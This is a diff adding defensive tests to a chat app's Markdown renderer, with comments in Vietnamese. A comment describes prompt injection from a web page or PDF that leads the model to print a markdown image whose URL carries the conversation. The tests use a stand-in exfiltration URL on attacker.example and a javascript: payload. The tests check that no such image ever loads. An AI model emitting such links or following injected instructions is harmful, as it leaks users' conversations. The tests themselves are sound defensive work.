@@ -103,6 +103,35 @@ describe("Markdown — prose", () => {
   });
 });
 
+// Prompt injection trong một trang web (Research) hay một file PDF có thể bảo
+// model in ra ![](https://kẻ-gian/?d=<nội dung hội thoại>). Nếu ảnh tự tải,
+// trình duyệt gửi luôn dữ liệu đi mà người dùng không bấm gì.
+describe("Markdown — images never load by themselves", () => {
+  const LEAK = "https://attacker.example/p.png?d=noi-dung-bi-lo";
+
+  it("shows an image as a link naming its site, and loads nothing", () => {
+    const { container } = render(<Markdown text={`Tóm tắt xong ![biểu đồ](${LEAK})`} />);
+
+    expect(container.querySelector("img")).toBeNull();
+    const link = screen.getByRole("link", { name: /biểu đồ.*attacker\.example/ });
+    expect(link).toHaveAttribute("href", LEAK);
+    expect(link).toHaveAttribute("rel", expect.stringContaining("noreferrer"));
+  });
+
+  it("gives an image with no alt text a generic label", () => {
+    render(<Markdown text={`![](${LEAK})`} />);
+
+    expect(screen.getByRole("link", { name: /Ảnh.*attacker\.example/ })).toBeInTheDocument();
+  });
+
+  it("drops an image whose address isn't http(s)", () => {
+    const { container } = render(<Markdown text={"![x](javascript:alert(1)) ![y](data:image/png;base64,AAAA)"} />);
+
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("a")).toBeNull();
+  });
+});
+
 describe("Markdown — citations", () => {
   const SOURCES = [
     { title: "Attention Is All You Need", url: "https://arxiv.org/abs/1706.03762", source: "arxiv", snippet: "The dominant sequence transduction models…" },
